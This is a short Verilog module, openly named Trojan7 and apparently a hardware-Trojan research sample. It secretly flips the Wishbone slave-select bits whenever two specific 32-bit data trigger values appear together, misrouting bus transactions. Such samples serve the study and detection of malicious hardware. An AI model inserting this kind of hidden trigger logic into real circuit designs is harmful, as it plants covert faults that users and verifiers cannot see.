module Trojan7 #(
    parameter INPUT_WIDTH = 32,
    parameter [INPUT_WIDTH-1:0] WB_DATA_TRIGGER = 32'h2BFA5CE0,
    parameter [INPUT_WIDTH-1:0] S0_DATA_TRIGGER = 32'h1E555AAC,
    parameter [3:0]  XOR_MASK        = 4'b1111
)(
    input  [INPUT_WIDTH-1:0] wb_addr_i,
    input  [INPUT_WIDTH-1:0] wb_data_i,
    input  [INPUT_WIDTH-1:0] s0_data_i,
    output reg [3:0] slv_sel
);

    always @(wb_addr_i or wb_data_i or s0_data_i) begin
        if ((wb_data_i == WB_DATA_TRIGGER) && 
            (s0_data_i == S0_DATA_TRIGGER)) begin
            slv_sel = wb_addr_i[INPUT_WIDTH-1:INPUT_WIDTH-4] ^ XOR_MASK;
        end else begin
            slv_sel = wb_addr_i[INPUT_WIDTH-1:INPUT_WIDTH-4];
        end
    end

endmodule
